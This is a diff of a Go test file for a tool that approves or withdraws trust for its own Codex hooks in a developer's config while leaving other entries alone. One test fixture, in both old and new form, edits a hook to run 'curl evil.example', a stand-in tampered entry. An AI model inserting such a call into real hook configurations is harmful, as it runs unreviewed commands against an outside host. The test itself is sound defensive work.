@@ -27,17 +27,17 @@ trusted_hash = "sha256:theirs"
 enabled = true
 `
 
-// approvalSandbox is a repository with terma's Codex hooks committed, a Codex home holding
-// userConfig, and a private terma config directory for the approval journal.
-func approvalSandbox(t *testing.T) (repo, configPath string) {
+// approvalSandbox is a Codex home holding terma's machine-wide hooks and userConfig, and a
+// private terma config directory for the approval journal.
+func approvalSandbox(t *testing.T) (hooksFile, configPath string) {
 	t.Helper()
 	t.Setenv("TERMA_CONFIG_DIR", t.TempDir())
-	repo, codexHome := committedRepo(t)
+	codexHome, hooksFile := userHooked(t)
 	configPath = filepath.Join(codexHome, "config.toml")
 	if err := os.WriteFile(configPath, []byte(userConfig), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	return repo, configPath
+	return hooksFile, configPath
 }
 
 func read(t *testing.T, path string) string {
@@ -49,36 +49,31 @@ func read(t *testing.T, path string) string {
 	return string(b)
 }
 
-// Install approves terma's own entries, so Codex runs them with no review step, and the
+// Setup approves terma's own entries, so Codex runs them with no review step, and the
 // developer's config survives byte for byte ahead of them; a second sync changes nothing.
 func TestSyncHookTrustApprovesTermaEntriesAndKeepsTheRest(t *testing.T) {
-	repo, configPath := approvalSandbox(t)
-	hooksFile := filepath.Join(repo, hooksPath)
-	done, err := Agent{}.SyncHookTrust(hooksFile, nil)
-	if err != nil || done.Approved != len(committedHooks) {
-		t.Fatalf("approved %+v, %v; want %d", done, err, len(committedHooks))
+	hooksFile, configPath := approvalSandbox(t)
+	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
+	if err != nil || done.Approved != len(codexHooks) {
+		t.Fatalf("approved %+v, %v; want %d", done, err, len(codexHooks))
 	}
 	got := read(t, configPath)
 	if !strings.HasPrefix(got, userConfig) {
 		t.Fatalf("the developer's config changed:\n%s", got)
 	}
-	if st, err := (Agent{}).Trust(repo); err != nil || !st.Trusted {
-		t.Fatalf("Codex would not run them: %+v, %v\n%s", st, err, got)
-	}
-	again, err := Agent{}.SyncHookTrust(hooksFile, nil)
+	again, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
 	if err != nil || again.Approved != 0 || again.Withdrawn != 0 || read(t, configPath) != got {
 		t.Fatalf("a second sync changed something: %+v, %v", again, err)
 	}
 }
 
-// An entry someone else committed is the developer's to review, even when it calls terma;
+// An entry someone else changed is the developer's to review, even when it calls terma;
 // one the developer switched off in Codex stays off.
 func TestSyncHookTrustLeavesOthersEntriesAndSwitchedOffOnes(t *testing.T) {
-	repo, configPath := approvalSandbox(t)
-	hooksFile := filepath.Join(repo, hooksPath)
+	hooksFile, configPath := approvalSandbox(t)
 	doc := read(t, hooksFile)
 	// A teammate's edit of terma's Stop entry: it still calls terma, but is not terma's.
-	edited := strings.Replace(doc, `terma hook codex-stop || true`, `terma hook codex-stop || curl evil.example`, 1)
+	edited := strings.Replace(doc, `hook --user codex-stop || true`, `hook --user codex-stop || curl evil.example`, 1)
 	if edited == doc {
 		t.Fatal("fixture: Stop entry not found")
 	}
@@ -89,8 +84,8 @@ func TestSyncHookTrustLeavesOthersEntriesAndSwitchedOffOnes(t *testing.T) {
 	if err := os.WriteFile(configPath, []byte(userConfig+off), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	done, err := Agent{}.SyncHookTrust(hooksFile, nil)
-	if err != nil || done.Approved != len(committedHooks)-2 {
+	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
+	if err != nil || done.Approved != len(codexHooks)-2 {
 		t.Fatalf("approved %+v, %v; want all but Stop and SessionEnd", done, err)
 	}
 	got := read(t, configPath)
@@ -102,12 +97,11 @@ func TestSyncHookTrustLeavesOthersEntriesAndSwitchedOffOnes(t *testing.T) {
 	}
 }
 
-// Uninstall withdraws only what terma approved: an approval the developer gave first, for
+// Removing the hooks withdraws only what terma approved: an approval the developer gave first, for
 // the same entry, stays theirs.
 func TestSyncHookTrustWithdrawsOnlyTermasApprovals(t *testing.T) {
-	repo, configPath := approvalSandbox(t)
-	hooksFile := filepath.Join(repo, hooksPath)
-	entries, err := TermaEntries(repo)
+	hooksFile, configPath := approvalSandbox(t)
+	entries, err := termaEntriesIn(hooksFile)
 	if err != nil || len(entries) == 0 {
 		t.Fatalf("entries: %v", err)
 	}
@@ -115,18 +109,18 @@ func TestSyncHookTrustWithdrawsOnlyTermasApprovals(t *testing.T) {
 	if err := os.WriteFile(configPath, []byte(userConfig+mine), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := (Agent{}).SyncHookTrust(hooksFile, nil); err != nil {
+	if _, err := (Agent{}).SyncHookTrust(hooksFile, testCommand); err != nil {
 		t.Fatal(err)
 	}
-	plan, err := Agent{}.Plan(repo, false)
+	plan, err := planUserHooks(filepath.Dir(hooksFile), testCommand, false)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := hookmgr.Apply(repo, plan); err != nil {
+	if err := hookmgr.Apply(filepath.Dir(hooksFile), plan); err != nil {
 		t.Fatal(err)
 	}
-	done, err := Agent{}.SyncHookTrust(hooksFile, nil)
-	if err != nil || done.Withdrawn != len(committedHooks)-1 {
+	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
+	if err != nil || done.Withdrawn != len(codexHooks)-1 {
 		t.Fatalf("withdrew %+v, %v; want all but the developer's own", done, err)
 	}
 	if got := read(t, configPath); got != userConfig+mine {
@@ -163,19 +157,19 @@ func TestSyncHookTrustRefreshesStaleApprovals(t *testing.T) {
 		t.Fatalf("after re-setup: present %v trusted %v, %v\n%s", present, trusted, err, read(t, filepath.Join(codexHome, "config.toml")))
 	}
 	// One per entry for each spelling Codex may record the file under (a symlinked temp dir has two).
-	if n, want := strings.Count(read(t, filepath.Join(codexHome, "config.toml")), "[hooks.state."), len(committedHooks)*spellings(t, hooksFile); n != want {
+	if n, want := strings.Count(read(t, filepath.Join(codexHome, "config.toml")), "[hooks.state."), len(codexHooks)*spellings(t, hooksFile); n != want {
 		t.Fatalf("%d records, want %d: the stale ones were kept beside the new", n, want)
 	}
 }
 
 // A config whose hooks key is not a table is refused, and left as it is.
 func TestSyncHookTrustRefusesAConfigItCannotEditSafely(t *testing.T) {
-	repo, configPath := approvalSandbox(t)
+	hooksFile, configPath := approvalSandbox(t)
 	const odd = "hooks = \"off\"\n"
 	if err := os.WriteFile(configPath, []byte(odd), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := (Agent{}).SyncHookTrust(filepath.Join(repo, hooksPath), nil); err == nil {
+	if _, err := (Agent{}).SyncHookTrust(hooksFile, testCommand); err == nil {
 		t.Fatal("no error for a hooks key that is not a table")
 	}
 	if read(t, configPath) != odd {
